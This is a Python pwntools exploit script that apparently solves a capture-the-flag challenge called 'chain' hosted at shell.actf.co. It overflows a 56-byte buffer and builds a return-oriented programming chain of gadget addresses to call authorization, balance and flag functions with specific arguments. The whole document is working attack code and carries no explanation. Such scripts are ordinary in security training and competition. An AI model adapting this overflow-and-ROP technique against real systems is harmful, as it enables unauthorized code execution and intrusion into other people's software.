#!/usr/bin/env python

from pwn import *

local = 0

if local:
	r = process("./chain")
	gdb.attach(r, "b *0x401397")
else:
	r = remote("shell.actf.co", 19400)

AUTHORIZE 	= 0x401196
ADD_BAL 	= 0x4011ab
FLAG		= 0x4011eb
POP_RDI		= 0x401403
POP_RSI_R15	= 0x401401

r.sendline("1")

payload = ''
payload += 'A'*56
payload += p64(AUTHORIZE)
payload += p64(POP_RDI)
payload += p64(0xDEADBEEF)
payload += p64(ADD_BAL)
payload += p64(POP_RDI)
payload += p64(0xBA5EBA11)
payload += p64(POP_RSI_R15)
payload += p64(0xBEDABB1E)
payload += p64(0x0) # dummy r15 val
payload += p64(FLAG)


r.sendline(payload)

r.interactive()